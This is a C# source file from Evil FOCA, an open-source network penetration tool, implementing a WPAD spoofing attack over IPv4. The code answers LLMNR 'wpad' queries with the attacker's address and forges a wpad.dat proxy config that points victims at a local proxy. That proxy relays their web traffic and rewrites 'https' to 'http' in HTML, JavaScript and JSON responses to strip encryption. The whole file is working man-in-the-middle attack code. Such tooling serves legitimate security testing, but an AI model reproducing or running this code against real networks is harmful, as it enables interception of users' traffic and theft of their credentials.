/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using evilfoca.HTTP;
using PacketDotNet;
using SharpPcap.WinPcap;
using System;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;

namespace evilfoca.Attacks
{
    public class WpadIPv4Attack
    {

        private const int proxyPort = 61642;
        private const int maxLength = 1300;
        private HttpListener httpListener;

        private static object locker = new object();
        private static object getterLocker = new object();
        private static WpadIPv4Attack _instance;
        public static WpadIPv4Attack Instance
        {
            get
            {
                if (_instance == null)
                {
                    lock (getterLocker)
                    {
                        if (_instance == null)
                            _instance = new WpadIPv4Attack();
                    }
                }
                return _instance;
            }
        }

        private WpadIPv4Attack()
        {
            CreateProxyListener();
        }


        public void GenerateLLMNRResponse(Packet packet)
        {
            try
            {
                LLMNR.LLMNRPacket llmnr = new LLMNR.LLMNRPacket();
                llmnr.ParsePacket(((UdpPacket)(packet.PayloadPacket.PayloadPacket)).PayloadData);
                if (llmnr.Query.Name.ToLower().Equals("wpad") && llmnr.Query.Type.Value == LLMNR.DNSType.A)
                {

                    WinPcapDevice dev = Program.CurrentProject.data.GetDevice();
                    IPAddress ip = Program.CurrentProject.data.GetIPv4FromDevice(dev);
                    byte[] ipv4Addr = ip.GetAddressBytes();

                    llmnr.AnswerList.Add(new LLMNR.DNSAnswer()
                    {
                        Class = evilfoca.LLMNR.DNSClass.IN,
                        Name = llmnr.Query.Name,
                        Type = evilfoca.LLMNR.DNSType.A,
                        RData = ipv4Addr,
                        RDLength = (short)ipv4Addr.Length,
                        TTL = 12
                    });
                    llmnr.IsResponse = true;


                    EthernetPacket ethDns = new EthernetPacket(dev.MacAddress, ((EthernetPacket)packet).SourceHwAddress, EthernetPacketType.IpV4);
                    IPv4Packet ipv4Dns = new IPv4Packet(ip, ((IPv4Packet)((EthernetPacket)packet).PayloadPacket).SourceAddress);
                    UdpPacket udpDns = new UdpPacket(((UdpPacket)(packet.PayloadPacket.PayloadPacket)).DestinationPort, ((UdpPacket)(packet.PayloadPacket.PayloadPacket)).SourcePort);

                    udpDns.PayloadData = llmnr.BuildPacket();

                    ipv4Dns.PayloadPacket = udpDns;


                    udpDns.UpdateCalculatedValues();
                    udpDns.UpdateUDPChecksum();

                    ipv4Dns.UpdateIPChecksum();
                    ipv4Dns.UpdateCalculatedValues();
                    ethDns.PayloadPacket = ipv4Dns;
                    Program.CurrentProject.data.SendPacket(ethDns);
                }
            }
            catch (Exception)
            {
            }
        }

        public void SendWpadFile(Packet packet)
        {
            lock (locker)
            {
                if (packet is EthernetPacket)
                {
                    EthernetPacket ethPacket = packet as EthernetPacket;
                    IPv4Packet ipv4Source = (IPv4Packet)packet.PayloadPacket;

                    if (ipv4Source.PayloadPacket is PacketDotNet.TcpPacket)
                    {
                        TcpPacket tcp = ipv4Source.PayloadPacket as TcpPacket;
                        string element = string.Format("{0}/{1}", tcp.SequenceNumber, tcp.AcknowledgmentNumber);


                        ushort destPort = tcp.SourcePort;
                        ushort sourcePort = tcp.DestinationPort;
                        IPAddress destAddress = ipv4Source.SourceAddress;
                        IPAddress sourceAddress = ipv4Source.DestinationAddress;
                        PhysicalAddress sourceMac = Program.CurrentProject.data.GetDevice().MacAddress;
                        PhysicalAddress destMac = ethPacket.SourceHwAddress;

                        tcp.SourcePort = sourcePort;
                        tcp.DestinationPort = destPort;

                        if (tcp.Syn && !tcp.Ack && !tcp.Rst && tcp.PayloadData.Length == 0 && sourcePort == 80)
                        {
                            tcp.Ack = true;
                            tcp.AcknowledgmentNumber = tcp.SequenceNumber + 1;
                            tcp.SequenceNumber = tcp.SequenceNumber + 38;
                            tcp.WindowSize = 14600;

                            IPv4Packet ipv4Ack = new IPv4Packet(sourceAddress, destAddress);
                            ipv4Ack.PayloadPacket = tcp;

                            EthernetPacket eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV4);

                            eth.PayloadPacket = ipv4Ack;
                            (eth.PayloadPacket as IPv4Packet).UpdateIPChecksum();
                            (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                            Program.CurrentProject.data.SendPacket(eth);
                        }
                        else if (!tcp.Syn && tcp.Ack && tcp.PayloadData != null && !tcp.Rst && tcp.PayloadData.Length > 0 && sourcePort == 80)
                        {
                            if (Data.Data.WpadReqList.Contains(element))
                                return;

                            Data.Data.WpadReqList.Add(element);
                            HttpPacket http = new HttpPacket(((TcpPacket)(packet.PayloadPacket.PayloadPacket)).PayloadData);
                            if (http.FullUrlRequest.Contains("wpad.dat"))
                            {
                                tcp.Psh = true;
                                tcp.Fin = true;
                                tcp.Ack = true;
                                tcp.SequenceNumber = (ipv4Source.PayloadPacket as TcpPacket).AcknowledgmentNumber;
                                tcp.AcknowledgmentNumber = tcp.SequenceNumber;
                                string jsFunction = string.Format("function FindProxyForURL(url, host){{return \"PROXY {0}:{1}\";}}", ipv4Source.DestinationAddress.ToString(), proxyPort);
                                string htmlHeader = string.Format("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: {0}\r\n\r\n", jsFunction.Length);
                                tcp.PayloadData = System.Text.Encoding.UTF8.GetBytes(string.Concat(htmlHeader, jsFunction));


                                EthernetPacket eth = new EthernetPacket(ethPacket.DestinationHwAddress, ethPacket.SourceHwAddress, EthernetPacketType.IpV4);
                                IPv4Packet ip4 = new IPv4Packet(ipv4Source.DestinationAddress, ipv4Source.SourceAddress);
                                ip4.PayloadPacket = tcp;

                                eth.PayloadPacket = ip4;

                                (eth.PayloadPacket as IPv4Packet).UpdateIPChecksum();
                                (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                                Program.CurrentProject.data.SendPacket(eth);
                            }
                        }
                        else if (tcp.Fin && tcp.Ack && !tcp.Rst && tcp.PayloadData.Length == 0)
                        {
                            tcp.Ack = true;
                            tcp.Fin = false;
                            uint ackOrg = tcp.AcknowledgmentNumber;
                            tcp.AcknowledgmentNumber = tcp.SequenceNumber + 1;
                            tcp.SequenceNumber = ackOrg;
                            tcp.WindowSize = 1400;

                            IPv4Packet ipv4Ack = new IPv4Packet(sourceAddress, destAddress);
                            ipv4Ack.PayloadPacket = tcp;
                            EthernetPacket eth = new EthernetPacket(sourceMac, destMac, EthernetPacketType.IpV4);
                            eth.PayloadPacket = ipv4Ack;

                            (eth.PayloadPacket as IPv4Packet).UpdateIPChecksum();
                            (eth.PayloadPacket.PayloadPacket as TcpPacket).UpdateTCPChecksum();
                            Program.CurrentProject.data.SendPacket(eth);
                        }
                    }
                }
            }
        }

        private void CreateProxyListener()
        {
            try
            {
                if (HttpListener.IsSupported)
                {
                    httpListener = new HttpListener();
                    httpListener.Prefixes.Add(string.Format("http://*:{0}/", proxyPort));
                    httpListener.Start();
                    httpListener.BeginGetContext(HttpRequestReceived, null);
                    Program.LogThis(string.Format("Proxy up on port {0}", proxyPort), Logs.Log.LogType.WpadIPv4);
                }
                else
                {
                    Program.LogThis("Your OS does not support HttpListener", Logs.Log.LogType.WpadIPv4);
                }
            }
            catch (Exception e)
            {
                Program.LogThis(string.Format("Cannot create Proxy on port {0}. Error: {1}", proxyPort, e.Message), Logs.Log.LogType.WpadIPv4);
            }

        }

        private void HttpRequestReceived(IAsyncResult result)
        {
            HttpListenerResponse response = null;
            try
            {
                HttpListenerContext context = httpListener.EndGetContext(result);
                HttpListenerRequest request = context.Request;
                Program.LogThis(string.Format("Request from {0}", request.RemoteEndPoint.Address.ToString()), Logs.Log.LogType.WpadIPv4);
                response = context.Response;

                if (request.Url.Host.Contains("google") && request.Url.PathAndQuery.Contains("/xjs/_/js/"))
                    throw new WebException("", null, WebExceptionStatus.UnknownError, null);

                HttpWebRequest evilReq = HttpUtils.CreateWebRequest(request);
                HttpWebResponse evilResponse = evilReq.GetResponse() as HttpWebResponse;

                if ((evilResponse.StatusCode == HttpStatusCode.Redirect || evilResponse.StatusCode == HttpStatusCode.Moved || evilResponse.StatusCode == HttpStatusCode.Found)
                    && !string.IsNullOrEmpty(evilResponse.Headers[HttpResponseHeader.Location])
                    && evilResponse.Headers[HttpResponseHeader.Location].Equals(evilReq.RequestUri.ToString().Replace("http://", "https://")))
                {
                    evilReq = HttpUtils.CreateWebRequest(request, new Uri(evilResponse.Headers[HttpResponseHeader.Location]));
                    evilResponse = evilReq.GetResponse() as HttpWebResponse;
                }

                HttpUtils.CreateListenerResponse(evilResponse, ref response);

                using (System.IO.Stream output = response.OutputStream)
                {
                    using (BinaryReader reader = new BinaryReader(evilResponse.GetResponseStream()))
                    {
                        int bytesRead;
                        byte[] buffer = new byte[maxLength];
                        Encoding responseEncoding = null;
                        while ((bytesRead = reader.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            Array.Resize(ref buffer, bytesRead);
                            if (evilResponse.ContentType.ToLower().Contains("html") || evilResponse.ContentType.ToLower().Contains("javascript") || evilResponse.ContentType.ToLower().Contains("json"))
                            {
                                if (responseEncoding == null)
                                    responseEncoding = GetResponseEncoding(evilResponse.CharacterSet);
                                string htmlContent = responseEncoding.GetString(buffer);
                                htmlContent = htmlContent.Replace("https", "http").Replace("Https", "http");

                                byte[] htmlBytes = responseEncoding.GetBytes(htmlContent);

                                output.Write(htmlBytes, 0, htmlBytes.Length);
                            }
                            else
                                output.Write(buffer, 0, buffer.Length);

                            buffer = new byte[maxLength];
                        }
                    }
                }
                evilResponse.Close();
            }
            catch (WebException)
            {
                if (response != null)
                {
                    response.StatusCode = 404;
                    response.ContentLength64 = 0;
                }
            }
            catch (Exception)
            { }
            finally
            {
                if (response != null)
                    response.Close();
                httpListener.BeginGetContext(HttpRequestReceived, null);
            }


        }

        private static Encoding GetResponseEncoding(string encodingValue)
        {
            Encoding enc;
            try
            {
                enc = Encoding.GetEncoding(encodingValue);
            }
            catch (ArgumentException)
            {
                switch (encodingValue)
                {
                    case "cp1252":
                        enc = Encoding.GetEncoding("Windows-1252");
                        break;
                    case "utf8":
                        enc = Encoding.UTF8;
                        break;
                    default:
                        enc = Encoding.UTF8;
                        break;
                }
            }


            return enc;
        }
    }
}
